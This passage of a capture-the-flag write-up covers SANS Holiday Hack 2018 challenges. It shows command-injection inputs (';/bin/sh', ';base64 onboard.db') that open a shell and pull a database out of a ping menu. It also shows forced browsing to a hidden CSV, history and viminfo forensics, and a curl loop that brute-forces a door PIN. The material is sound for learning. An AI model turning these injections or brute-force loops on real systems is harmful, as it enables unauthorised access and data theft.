            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nb"&gt;Write-Host&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Invalid entry.&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="n"&gt;pause&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$input&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;finally&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It seems that our menu has an hidden function. If we input &lt;code&gt;9&lt;/code&gt;, we get
access to a PowerShell console. Let's do so, and use our shell to analyze the
&lt;code&gt;onboard.db&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;Please make a selection: 9&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;PowerShell v6.0.3&lt;/span&gt;
&lt;span class="go"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;

&lt;span class="go"&gt;https://aka.ms/pscore6-docs&lt;/span&gt;
&lt;span class="go"&gt;Type &amp;#39;help&amp;#39; to get help.&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; sqlite3 ./onboard.db&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;SQLite version 3.11.0 2016-02-15 17:29:24&lt;/span&gt;
&lt;span class="go"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;sqlite&amp;gt; .schema&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;CREATE TABLE onboard (&lt;/span&gt;
&lt;span class="go"&gt;    id INTEGER PRIMARY KEY,&lt;/span&gt;
&lt;span class="go"&gt;    fname TEXT NOT NULL,&lt;/span&gt;
&lt;span class="go"&gt;    lname TEXT NOT NULL,&lt;/span&gt;
&lt;span class="go"&gt;    street1 TEXT,&lt;/span&gt;
&lt;span class="go"&gt;    street2 TEXT,&lt;/span&gt;
&lt;span class="go"&gt;    city TEXT,&lt;/span&gt;
&lt;span class="go"&gt;    postalcode TEXT,&lt;/span&gt;
&lt;span class="go"&gt;    phone TEXT,&lt;/span&gt;
&lt;span class="go"&gt;    email TEXT&lt;/span&gt;
&lt;span class="go"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;sqlite&amp;gt; select * from onboard where lname = &amp;#39;Chan&amp;#39;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hello, Scott Chan! We can now use &lt;code&gt;runtoanswer&lt;/code&gt; to input our answer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; ./runtoanswer&lt;/span&gt;
&lt;span class="go"&gt;Loading, please wait.....&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Enter Mr. Chan&amp;#39;s first name: Scott&lt;/span&gt;
&lt;/span&gt;
&lt;span class="go"&gt;    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;  &amp;#39;ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO   Okdooooooooooooo;&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;oooooooooooooX  ooooO  xod       xoO  xooooo  Xoooook    0    Oooooooooooooo;&lt;/span&gt;
&lt;span class="go"&gt; :oooooooooooooX  ooooO  xod  0ooooooO  xooooo  Xoooox   ooooo   kooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; coooooooooooooX         xod      0ooO  xooooo  XooooO  koooook   ooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; coooooooooooooX  dddd0  xod  0ddddooO  xooooo  XooooO  OoooooO  kooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; coooooooooooooX  ooooO  xod  KxxxxdoO  Okkkxo  XkkkkdX   xxk    oooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; cooooooooooooo0  ooook  dod       kok      Oo      Xook      Kxooooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; cooooooooooooooooooooooooooooooooo MY NAME IS oooooooooooooooooooooooooooooooo&lt;/span&gt;
&lt;span class="go"&gt; cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMW:  .. ;MMMk&amp;#39;     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMX.  .cOWMN  &amp;#39;MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW&lt;/span&gt;
&lt;span class="go"&gt; xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK&lt;/span&gt;
&lt;span class="go"&gt; .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,&lt;/span&gt;
&lt;span class="go"&gt;  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,&lt;/span&gt;
&lt;span class="go"&gt;    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.&lt;/span&gt;

&lt;span class="go"&gt;Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lucky we had this hidden functionality. But what if it wasn't there? Well, we
can still use our command injection vulnerability to drop to a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Validating data store for employee onboard information.
&lt;span class="hll"&gt;Enter address of server: ;/bin/sh
&lt;/span&gt;Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
&lt;span class="hll"&gt;$ ls
&lt;/span&gt;menu.ps1  onboard.db  runtoanswer
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And what if we can't run &lt;code&gt;/bin/sh&lt;/code&gt;? Well, we can still recover the SQLite
database file, and analyze it offline. To do so, we can base64 encode it, which
is kind of my favorite trick:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Validating data store for employee onboard information.
&lt;span class="hll"&gt;Enter address of server: ;base64 onboard.db
&lt;/span&gt;Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAAQAAAAYAAAAAAAAAAAAAAAEAAAAEAAAAAAAAAAAA
AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAC4FQg0AAAABDxUADxUAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[snip]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We then copy/paste the encoded file to our computer, decode it, and interrogate
it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; base64 -d &amp;lt; onboard.db.b64 &amp;gt; onboard.db
&lt;span class="gp"&gt;$&lt;/span&gt; file onboard.db
&lt;span class="go"&gt;onboard.db: SQLite 3.x database, last written using SQLite version 3016002&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; sqlite3 onboard.db
&lt;span class="go"&gt;SQLite version 3.22.0 2018-01-22 18:45:57&lt;/span&gt;
&lt;span class="go"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="go"&gt;sqlite&amp;gt; select * from onboard where lname=&amp;quot;Chan&amp;quot;;&lt;/span&gt;
&lt;span class="go"&gt;84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="analyzing-the-kringlecon-cfp-website"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id11"&gt;Analyzing the KringleCon CFP website&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're asked to find who submitted the rejected talk titled &lt;strong&gt;Data Loss for
Rainbow Teams: A Path in the Darkness&lt;/strong&gt;, and to take a look at &lt;a class="reference external" href="https://cfp.kringlecastle.com/"&gt;KringleCon's
CFP website&lt;/a&gt; to find out.&lt;/p&gt;
&lt;p&gt;The web site is simple enough, and has a link marked &amp;quot;CFP&amp;quot;. When we click on
it, we're taken to the webpage &lt;a class="reference external" href="https://cfp.kringlecastle.com/cfp/cfp.html"&gt;https://cfp.kringlecastle.com/cfp/cfp.html&lt;/a&gt;,
which tells us that the CFP is closed. However, we're not at the root of the
&lt;code&gt;cfp&lt;/code&gt; folder. Let's forcefully browse to
&lt;a class="reference external" href="https://cfp.kringlecastle.com/cfp/"&gt;https://cfp.kringlecastle.com/cfp/&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="cfp_rejected_talks.png" class="align-center" src="/images/sans-christmas-challenge-2018/cfp_rejected_talks.png" /&gt;
&lt;p&gt;We find a CSV file called &lt;code&gt;rejected-talks.csv&lt;/code&gt;. If we search the talk
name in it, we'll find that submitter is one &lt;a class="reference external" href="https://en.wikipedia.org/wiki/John_McClane"&gt;John McClane&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl https://cfp.kringlecastle.com/cfp/rejected-talks.csv &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null &lt;span class="p"&gt;|&lt;/span&gt; grep -i &lt;span class="s1"&gt;&amp;#39;Data Loss for Rainbow Teams: A Path in the Darkness&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="de-bruijn-sequences"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id12"&gt;de Bruijn Sequences&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="tangle-coalbox-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id13"&gt;Tangle Coalbox's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Apparently, a girl elf has been given a love poem by a boy elf, and ER (Elf
Ressources) has been involved, because a complaint has been made. We're asked
to find the firstname of the elf who received the love poem.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Christmas is coming, and so it would seem,&lt;/span&gt;
&lt;span class="go"&gt;ER (Elf Resources) crushes elves&amp;#39; dreams.&lt;/span&gt;
&lt;span class="go"&gt;One tells me she was disturbed by a bloke.&lt;/span&gt;
&lt;span class="go"&gt;He tells me this must be some kind of joke.&lt;/span&gt;
&lt;span class="go"&gt;Please do your best to determine what&amp;#39;s real.&lt;/span&gt;
&lt;span class="go"&gt;Has this jamoke, for this elf, got some feels?&lt;/span&gt;
&lt;span class="go"&gt;Lethal forensics ain&amp;#39;t my cup of tea;&lt;/span&gt;
&lt;span class="go"&gt;If YOU can fake it, my hero you&amp;#39;ll be.&lt;/span&gt;
&lt;span class="go"&gt;One more quick note that might help you complete,&lt;/span&gt;
&lt;span class="go"&gt;Clearing this mess up that&amp;#39;s now at your feet.&lt;/span&gt;
&lt;span class="go"&gt;Certain text editors can leave some clue.&lt;/span&gt;
&lt;span class="go"&gt;Did our young Romeo leave one for you?&lt;/span&gt;
&lt;span class="go"&gt;- Tangle Coalbox, ER Investigator&lt;/span&gt;
&lt;span class="go"&gt;  Find the first name of the elf of whom a love poem&lt;/span&gt;
&lt;span class="go"&gt;  was written.  Complete this challenge by submitting&lt;/span&gt;
&lt;span class="go"&gt;  that name to runtoanswer.&lt;/span&gt;
&lt;span class="gp"&gt;elf@612b2a7501cc:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's see what files we can see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@6bb580d3ee2e:~$&lt;/span&gt; ls -lha
&lt;span class="go"&gt;total 5.4M&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 root root 4.0K Dec 14 16:28 ..&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf  elf   419 Dec 14 16:13 .bash_history&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf  elf  3.5K Dec 14 16:28 .bashrc&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .secrets&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf  elf  5.0K Dec 14 16:13 .viminfo&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 elf  elf  5.3M Dec 14 16:13 runtoanswer&lt;/span&gt;
&lt;span class="gp"&gt;elf@6bb580d3ee2e:~$&lt;/span&gt; ls -lhaR .secrets/
&lt;span class="go"&gt;.secrets/:&lt;/span&gt;
&lt;span class="go"&gt;total 12K&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 her&lt;/span&gt;
&lt;span class="go"&gt;.secrets/her:&lt;/span&gt;
&lt;span class="go"&gt;total 12K&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 1.9K Dec 14 16:13 poem.txt&lt;/span&gt;
&lt;span class="gp"&gt;elf@6bb580d3ee2e:~$&lt;/span&gt; cat .secrets/her/poem.txt
&lt;span class="go"&gt;Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,&lt;/span&gt;
&lt;span class="go"&gt;Shining many a beautiful sleighbell bearing cheer and sound so pure--&lt;/span&gt;
&lt;span class="go"&gt;  There he cleaned them, nearly napping, suddenly there came a tapping,&lt;/span&gt;
&lt;span class="go"&gt;As of someone gently rapping, rapping at the sleigh house door.&lt;/span&gt;
&lt;span class="go"&gt;&amp;quot;&amp;#39;Tis some caroler,&amp;quot; he muttered, &amp;quot;tapping at my sleigh house door--&lt;/span&gt;
&lt;span class="go"&gt;  Only this and nothing more.&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Then, continued with more vigor, came the sound he didn&amp;#39;t figure,&lt;/span&gt;
&lt;span class="go"&gt;Could belong to one so lovely, walking &amp;#39;bout the North Pole grounds.&lt;/span&gt;
&lt;span class="go"&gt;  But the truth is, she WAS knocking, &amp;#39;cause with him she would be talking,&lt;/span&gt;
&lt;span class="go"&gt;Off with fingers interlocking, strolling out with love newfound?&lt;/span&gt;
&lt;span class="go"&gt;Gazing into eyes so deeply, caring not who sees their rounds.&lt;/span&gt;
&lt;span class="go"&gt;  Oh, &amp;#39;twould make his heart resound!&lt;/span&gt;
&lt;span class="go"&gt;Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.&lt;/span&gt;
&lt;span class="go"&gt;Floating over, more than walking, moving toward the sound still knocking,&lt;/span&gt;
&lt;span class="go"&gt;  Pausing at the elf-length mirror, checked himself to study clearer,&lt;/span&gt;
&lt;span class="go"&gt;Fixing hair and looking nearer, what a hunky elf - not shocking!&lt;/span&gt;
&lt;span class="go"&gt;Peering through the peephole smiling, reaching forward and unlocking:&lt;/span&gt;
&lt;span class="go"&gt;  NEVERMORE in tinsel stocking!&lt;/span&gt;
&lt;span class="go"&gt;Greeting her with smile dashing, pearly-white incisors flashing,&lt;/span&gt;
&lt;span class="go"&gt;Telling jokes to keep her laughing, soaring high upon the tidings,&lt;/span&gt;
&lt;span class="go"&gt;  Of good fortune fates had borne him.  Offered her his dexter forelimb,&lt;/span&gt;
&lt;span class="go"&gt;Never was his future less dim!  Should he now consider gliding--&lt;/span&gt;
&lt;span class="go"&gt;No - they shouldn&amp;#39;t but consider taking flight in sleigh and riding&lt;/span&gt;
&lt;span class="go"&gt;  Up above the Pole abiding?&lt;/span&gt;
&lt;span class="go"&gt;Smile, she did, when he suggested that their future surely rested,&lt;/span&gt;
&lt;span class="go"&gt;Up in flight above their cohort flying high like ne&amp;#39;er before!&lt;/span&gt;
&lt;span class="go"&gt;  So he harnessed two young reindeer, bold and fresh and bearing no fear.&lt;/span&gt;
&lt;span class="go"&gt;In they jumped and seated so near, off they flew - broke through the door!&lt;/span&gt;
&lt;span class="go"&gt;Up and up climbed team and humor, Morcel being so adored,&lt;/span&gt;
&lt;span class="go"&gt;  By his lovely NEVERMORE!&lt;/span&gt;
&lt;span class="go"&gt;-Morcel Nougat&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We find the poem in the &lt;code&gt;.secrets&lt;/code&gt; folder. Good stuff, there, Morcel...
Anyway, I first thought that the name of the elf was Nevermore, however it was
not the case. So let's keep looking.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@6bb580d3ee2e:~$&lt;/span&gt; cat .bash_history
&lt;span class="go"&gt;set -o history&lt;/span&gt;
&lt;span class="go"&gt;whoami&lt;/span&gt;
&lt;span class="go"&gt;echo &amp;quot;No, really...  /-:&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;mkdir -p .secrets/her/&lt;/span&gt;
&lt;span class="go"&gt;firefox https://www.google.com/search?q=love+poetry&lt;/span&gt;
&lt;span class="go"&gt;vim&lt;/span&gt;
&lt;span class="go"&gt;ls -lAR&lt;/span&gt;
&lt;span class="go"&gt;exit&lt;/span&gt;
&lt;span class="go"&gt;set -o history&lt;/span&gt;
&lt;span class="go"&gt;df -h&lt;/span&gt;
&lt;span class="go"&gt;who&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;firefox https://www.google.com/search?q=replacing+strings+in+vim&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;time vim&lt;/span&gt;
&lt;span class="go"&gt;ls -lAR&lt;/span&gt;
&lt;span class="go"&gt;exit&lt;/span&gt;
&lt;span class="go"&gt;set -o history&lt;/span&gt;
&lt;span class="go"&gt;vim&lt;/span&gt;
&lt;span class="go"&gt;exit&lt;/span&gt;
&lt;span class="go"&gt;ls -lA&lt;/span&gt;
&lt;span class="go"&gt;cat .bash_history&lt;/span&gt;
&lt;span class="go"&gt;echo &amp;quot;&amp;quot; &amp;gt;&amp;gt; .bash_history&lt;/span&gt;
&lt;span class="go"&gt;firefox https://www.google.com/search?q=turn+off+bash+history&lt;/span&gt;
&lt;span class="go"&gt;set +o history&lt;/span&gt;
&lt;span class="go"&gt;set +o history&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Apparently, in addition to ripping off love poem from the web, Morcel searched
how to replace strings in &lt;code&gt;vim&lt;/code&gt;. So he must have used &lt;code&gt;vim&lt;/code&gt; to
write the poem. Let's take a look at the &lt;code&gt;.viminfo&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@6bb580d3ee2e:~$&lt;/span&gt; cat .viminfo
&lt;span class="gp"&gt;#&lt;/span&gt; This viminfo file was generated by Vim &lt;span class="m"&gt;8&lt;/span&gt;.0.
&lt;span class="gp"&gt;#&lt;/span&gt; You may edit it &lt;span class="k"&gt;if&lt;/span&gt; you&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;re careful!
&lt;span class="gp"&gt;#&lt;/span&gt; Viminfo version
&lt;span class="go"&gt;|1,4&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; Value of &lt;span class="s1"&gt;&amp;#39;encoding&amp;#39;&lt;/span&gt; when this file was written
&lt;span class="go"&gt;*encoding=latin1&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; hlsearch on &lt;span class="o"&gt;(&lt;/span&gt;H&lt;span class="o"&gt;)&lt;/span&gt; or off &lt;span class="o"&gt;(&lt;/span&gt;h&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;span class="go"&gt;~h&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; Last Substitute Search Pattern:
&lt;span class="hll"&gt;&lt;span class="go"&gt;~MSle0~&amp;amp;Elinore&lt;/span&gt;
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; Last Substitute String:
&lt;span class="hll"&gt;&lt;span class="gp"&gt;$&lt;/span&gt;NEVERMORE
&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; Command Line History &lt;span class="o"&gt;(&lt;/span&gt;newest to oldest&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;span class="go"&gt;:q&lt;/span&gt;
&lt;span class="go"&gt;|2,0,1546268730,,&amp;quot;q&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;:wq&lt;/span&gt;
&lt;span class="go"&gt;|2,0,1536607231,,&amp;quot;wq&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;:%s/Elinore/NEVERMORE/g&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;|2,0,1536607217,,&amp;quot;%s/Elinore/NEVERMORE/g&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the name of the elf who received the poem seems to be Elinore.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="kringlecon-speaker-unpreparedness-room"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id14"&gt;KringleCon Speaker Unpreparedness room&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're in front of the unprepared speaker room, but there's a code to enter, by
pressing four different symbols, △□○☆:&lt;/p&gt;
&lt;img alt="door_code_intro.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_intro.png" /&gt;
&lt;div class="section" id="yannick-s-dirty-solution"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id15"&gt;Yannick's (dirty) solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;By pressing four of the buttons randomly, we get an error message:&lt;/p&gt;
&lt;img alt="door_code_first_incorrect_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_first_incorrect_guess.png" /&gt;
&lt;p&gt;If we take a look at the network requests that were made, we can see that a
&lt;code&gt;GET&lt;/code&gt; request was made to the &lt;a class="reference external" href="https://doorpasscoden.kringlecastle.com/checkpass.php?i=0003&amp;amp;resourceId=undefined"&gt;https://doorpasscoden.kringlecastle.com/checkpass.php?i=0003&amp;amp;resourceId=undefined&lt;/a&gt;
URL.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;i&lt;/code&gt; variable seems to be holding our passcode. If we click another
button, another request is directly made to &lt;a class="reference external" href="https://doorpasscoden.kringlecastle.com/checkpass.php?i=0031&amp;amp;resourceId=undefined"&gt;https://doorpasscoden.kringlecastle.com/checkpass.php?i=0031&amp;amp;resourceId=undefined&lt;/a&gt;&lt;/p&gt;
&lt;img alt="door_code_second_incorrect_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_second_incorrect_guess.png" /&gt;
&lt;p&gt;We can see that our &lt;code&gt;i&lt;/code&gt; variable went from &lt;code&gt;0003&lt;/code&gt; to &lt;code&gt;0031&lt;/code&gt;.
From this, we can see that:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;△ = 0&lt;/li&gt;
&lt;li&gt;□ = 1&lt;/li&gt;
&lt;li&gt;○ = 2&lt;/li&gt;
&lt;li&gt;☆ = 3&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A four-digit PIN means 10.000 possible values. It's quite easily manageable
by bruteforce, even online. So let's write a simple one-liner that will try
every possible value:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="sb"&gt;`&lt;/span&gt;seq -w &lt;span class="m"&gt;9999&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; curl &lt;span class="s2"&gt;&amp;quot;https://doorpasscoden.kringlecastle.com/checkpass.php?i=&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;resourceId=undefined&amp;quot;&lt;/span&gt; &amp;gt; &lt;span class="nv"&gt;$i&lt;/span&gt;.txt &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This loop will generate every number between &lt;code&gt;0000&lt;/code&gt; and &lt;code&gt;9999&lt;/code&gt;,
perform a &lt;code&gt;GET&lt;/code&gt; request to the URL that checks the passcode, and save the
output in a file named after the passcode. The &lt;code&gt;&amp;amp;&lt;/code&gt; before the
&lt;code&gt;done&lt;/code&gt; means that our &lt;code&gt;curl&lt;/code&gt; commands will run in their own thread.
After a few seconds, we can list our different files, and sort them by size:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ls -lhSr
&lt;span class="go"&gt;[snip]&lt;/span&gt;
